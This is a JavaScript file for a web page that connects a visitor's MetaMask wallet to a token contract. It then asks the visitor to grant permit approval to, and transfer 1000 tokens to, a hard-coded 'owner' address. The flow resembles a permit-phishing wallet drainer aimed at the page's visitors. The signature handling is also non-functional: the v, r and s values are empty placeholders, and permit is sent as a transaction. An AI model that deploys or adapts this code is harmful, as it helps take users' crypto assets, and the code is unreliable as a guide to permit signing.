const contractAddress = '0x2E9d30761DB97706C536A112B9466433032b28e3'; // 合约地址
const ownerAddress = '0xA465E2fc9F9D527AAEb07579E821D461F700e699'; // Owner 地址

let web3;
let contract;
let userAccount;

const contractABI = [
    {
        "inputs": [{"internalType": "address","name": "account","type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256","name": "","type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address","name": "owner","type": "address"},
            {"internalType": "address","name": "spender","type": "address"},
            {"internalType": "uint256","name": "value","type": "uint256"},
            {"internalType": "uint256","name": "deadline","type": "uint256"},
            {"internalType": "uint8","name": "v","type": "uint8"},
            {"internalType": "bytes32","name": "r","type": "bytes32"},
            {"internalType": "bytes32","name": "s","type": "bytes32"}
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address","name": "sender","type": "address"},
            {"internalType": "address","name": "recipient","type": "address"},
            {"internalType": "uint256","name": "amount","type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool","name": "","type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// 页面加载后绑定按钮事件
document.addEventListener("DOMContentLoaded", function() {
    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const signPermitBtn = document.getElementById('signPermitBtn');
    const transferTokensBtn = document.getElementById('transferTokensBtn');

    if (connectWalletBtn) {
        connectWalletBtn.addEventListener('click', connectWallet);
    }

    if (signPermitBtn) {
        signPermitBtn.addEventListener('click', signPermit);
    }

    if (transferTokensBtn) {
        transferTokensBtn.addEventListener('click', transferTokens);
    }
});

async function connectWallet() {
    console.log("Attempting to connect wallet...");
    if (window.ethereum) {
        try {
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = accounts[0];
            web3 = new Web3(window.ethereum);
            contract = new web3.eth.Contract(contractABI, contractAddress);

            document.getElementById('walletAddress').innerText = `Connected: ${userAccount}`;
            document.getElementById('signPermitBtn').disabled = false;
            document.getElementById('transferTokensBtn').disabled = false;
            console.log("Wallet connected:", userAccount);
            alert("钱包已连接: " + userAccount);
        } catch (error) {
            console.error("Error connecting to wallet:", error);
            alert("连接钱包时出错: " + error.message);
        }
    } else {
        alert("请安装 MetaMask!");
        console.warn("MetaMask is not installed.");
    }
}

async function signPermit() {
    console.log("Signing permit...");
    if (!web3 || !contract) {
        console.error("Wallet not connected or contract not initialized.");
        alert("请先连接钱包！");
        return;
    }

    try {
        // 设置签名参数 (根据具体实现补充)
        const permitData = {
            owner: userAccount,
            spender: ownerAddress,
            value: 1000,  // 授权的代币数量
            deadline: Math.floor(Date.now() / 1000) + 3600,  // 设置1小时后过期
            v: 0,  // 从MetaMask或其他签名工具获得
            r: "0x",  // 从MetaMask或其他签名工具获得
            s: "0x"   // 从MetaMask或其他签名工具获得
        };

        // 调用合约中的 permit 方法
        await contract.methods.permit(
            permitData.owner,
            permitData.spender,
            permitData.value,
            permitData.deadline,
            permitData.v,
            permitData.r,
            permitData.s
        ).send({ from: userAccount });

        alert("签名授权成功！");
    } catch (error) {
        console.error("Error signing permit:", error);
        alert("签名授权时出错: " + error.message);
    }
}

async function transferTokens() {
    console.log("Transferring tokens...");
    if (!web3 || !contract) {
        console.error("Wallet not connected or contract not initialized.");
        alert("请先连接钱包！");
        return;
    }

    try {
        // 代币转移参数
        const amount = 1000;  // 转移的代币数量

        // 调用 transferFrom 函数
        await contract.methods.transferFrom(userAccount, ownerAddress, amount).send({ from: userAccount });

        alert("代币转移成功！");
    } catch (error) {
        console.error("Error transferring tokens:", error);
        alert("代币转移时出错: " + error.message);
    }
}
